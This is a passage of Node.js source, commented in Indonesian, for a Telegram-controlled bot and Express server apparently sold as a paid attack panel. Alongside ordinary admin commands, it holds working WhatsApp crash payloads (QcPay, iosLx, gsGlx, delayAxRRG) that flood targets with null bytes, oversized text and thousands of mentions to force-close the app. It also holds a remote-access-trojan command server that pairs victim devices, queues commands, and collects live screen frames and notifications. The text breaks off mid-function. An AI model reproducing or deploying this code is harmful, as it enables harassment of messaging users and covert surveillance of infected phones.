        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://arzzpanel.arzzhostingxcloud.my.id:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*DarkVerse Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *AXRRG-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun by role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

// 🔘 Command reset dengan tombol konfirmasi
function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?${cmd}$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  // Handle klik tombol konfirmasi
  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const chatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(chatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(chatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

// 🔹 Daftarkan semua perintah
registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

// === FITUR /INFO <username> ===
bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    // cari data akun
    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    // ambil data dari database.json
    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    // ambil data dari keyList.json
    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* ${session}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

// === FITUR /STATS - STATUS BOT & USER ===
const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    // === Load database user ===
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    // === Cek session WhatsApp aktif (jika pakai Baileys MD) ===
    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;

    // === Buat tampilan stats ===
    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    // Hitung berapa kali setiap user membuat akun
    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    // Gabungkan data username, role, dan total akun dibuat
    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    // Urutkan dari yang paling banyak membuat akun
    list.sort((a, b) => b.total - a.total);

    // Format teks file
    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath); // hapus file setelah dikirim
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

// === Fitur /clearsession ===
bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    // Hapus seluruh isi folder permenmd
    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true }); // buat ulang folder kosong

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      // Cek apakah folder berisi file .json
      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

// ===== FITUR RESTART MANUAL (SAMA GAYA DENGAN AUTO RESTART) =====
bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
  }, 8000); // kirim pesan sukses setelah 8 detik

  // Tunggu 5 detik lalu restart
  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// Express sudah dijalankan lewat server.listen di atas

// ===== AUTO RESTART PANEL DENGAN STATUS TELEGRAM =====
const RESTART_INTERVAL = 20 * 60 * 1000; // 20 menit

function kirimStatusServer(pesan) {
  try {
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

// Kirim notifikasi saat server aktif
kirimStatusServer("✅ Server aktif dan berjalan normal.");

// Kirim notifikasi sebelum restart
setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0); // memicu restart otomatis di panel
  }, 5000); // beri jeda 5 detik agar pesan terkirim dulu
}, RESTART_INTERVAL);

async function QcPay(sock, target, zid = true) {
  const payload = "꧀".repeat(10000)
  const miaw = await generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      body: {
        text: payload
      },
      nativeFlowMessage: {
        messageVersion: 3,
        buttons: [
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `detail`
            })
          },
          {
            name: "quick_reply",
            buttonParamsJson: JSON.stringify({
              display_text: payload,
              id: `ssss`
            })
          }

        ]
      },
      contextInfo: {
        conversionDelaySeconds: 9999,
        forwardingScore: 999999,
        isForwarded: true,
        participant: "0@s.whatsapp.net",
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          serverMessageId: 1,
          newsletterName: payload,
          contentType: 3,
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: 999e+21 * 999e+21
          }
        },
        remoteJid: "@s.whatsapp.net"
      }
    }
  }), {});

  await sock.relayMessage(target, miaw.message, zid ? { messageId: miaw.key.id, participant: { jid: target } } : { messageId: miaw.key.id });
  await sleep(10000);
}

async function permenCall(sock, toJid, isVideo = true) {
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);

  const callLayout = []
  const offerContent = [
    //{ tag: 'audio', attrs: { enc: 'opus', rate: '16000' } },
    { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } },
    isVideo ? {
      tag: 'video',
      attrs: {
        enc: 'vp8',
        dec: 'vp8',
        orientation: '0',
        screen_width: '1920',
        screen_height: '1080',
        device_orientation: '0'
      }
    } : null,
    { tag: 'net', attrs: { medium: '3' } },
    { tag: 'capability', attrs: { ver: '1' }, content: Buffer.from([0x00, 0x00, 0x00, 0x00]) },
    { tag: 'encopt', attrs: { keygen: '2' } }
  ].filter(Boolean);

  callLayout.push({ tag: 'title', attrs: { ver: '1' }, content: 'PermenMD' })
  const encKey = crypto.randomBytes(32);
  const devices = (await sock.getUSyncDevices([toJid], true, false))
    .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

  await sock.assertSessions(devices, true);

  const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
    call: { callKey: new Uint8Array(encKey) }
  }, { count: '2' });

  offerContent.push({ tag: 'destination', attrs: {}, content: destinations });

  if (shouldIncludeDeviceIdentity) {
    const { encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys/lib/Utils');
    offerContent.push({
      tag: 'device-identity',
      attrs: {},
      content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
    });
  }

  const stanza = {
    tag: 'call',
    attrs: {
      id: sock.generateMessageTag(),
      to: toJid
    },
    content: [{
      tag: 'offer',
      attrs: {
        'call-id': callId,
        'call-creator': sock.user.id
      },
      content: offerContent
    }]
  };

  await sock.query(stanza).catch(err => console.error("❌ Error sending call:", err));
  return { id: callId, to: toJid };
}


async function iosLx(Yuukey, target) {
  for ( let z = 0; z < 2; z++ ) {
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/forno",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: null, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: { jid:target } });
  }
}

async function gsGlx(Yuukey, target, zid = true) {
  for(let z = 0; z < 10; z++) {
    let msg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`)
        }, 
        body: {
          text: "7eppeli - Expos3d",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
  
    await Yuukey.relayMessage(target, {
      groupStatusMessageV2: {
        message: msg.message
      }
    }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
  }
}
// ── RAT: Ambil pairId milik user (untuk ditampilkan di Device Dashboard) ──────
app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  // Generate pairId kalau belum ada dan simpan
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

// ── RAT: permission member bisa lihat device owner ────────────────────────────
// POST /rat/grant-member { ownerKey, memberUsername, deviceIds:[] / allDevices:bool }
app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  // Simpan permission ke member: bisa lihat device mana saja milik owner
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

// ── RAT: revoke akses member ───────────────────────────────────────────────────
app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

// ── RAT: member cek permission & ambil device yang boleh dilihat ──────────────
app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  // Owner & Dev: lihat semua device milik sendiri
  if (user.role === "owner" || user.role === "dev") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  // Member/reseller: cek device_perms.json (sistem utama)
  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      // Boleh lihat semua device dari semua owner
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      // Boleh lihat device tertentu saja
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    // Fallback: cek sistem lama ratPerms di database
    for (const owner of db.filter(u => u.role === "owner" || u.role === "dev")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});


// ══════════════════════════════════════════════════════════════════════════════
// RAT CORE ENDPOINTS (device target berkomunikasi via port ini)
// ══════════════════════════════════════════════════════════════════════════════

app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status   = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else          t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  
  // AUTO-FIX: generate pairId untuk semua user yang belum punya
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  // Cari owner berdasarkan pairId (case-insensitive)
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard AX RRG' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// Init RAT files
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});


// ════════════════════════════════════════════════════════════════════════════
// DELAY FC — Force Close WhatsApp via malformed interactive message
// Teknik: corrupt nativeFlowMessage dengan payload yang tidak bisa di-parse WA
async function delayAxRRG(sock, target) {
  const jid = target.includes("@s.whatsapp.net") ? target : target + "@s.whatsapp.net";
  try {
    // Method 1: Corrupt interactive native flow — bikin WA parser hang
    const badFlow = generateWAMessageFromContent(jid, {
      interactiveMessage: {
        header: {
          title: String.fromCharCode(0).repeat(500000),
          hasMediaAttachment: false
        },
        body: {
          text: String.fromCharCode(0).repeat(1000000)
        },
        footer: { text: "" },
        nativeFlowMessage: {
          buttons: Array.from({ length: 50000 }, (_, i) => ({
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: String.fromCharCode(0).repeat(50000) + i,
              url: "https://wa.me/" + String.fromCharCode(0).repeat(10000),
              merchant_url: "https://wa.me/" + String.fromCharCode(0).repeat(10000)
            })
          })),
          messageParamsJson: JSON.stringify({
            flow_token: String.fromCharCode(0).repeat(500000),
            flow_id: String.fromCharCode(0).repeat(200000),
            data: Object.fromEntries(
              Array.from({ length: 10000 }, (_, i) => [
                String.fromCharCode(0).repeat(1000) + i,
                String.fromCharCode(0).repeat(5000)
              ])
            )
          })
        },
        contextInfo: {
          forwardingScore: 999999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 5000 }, () =>
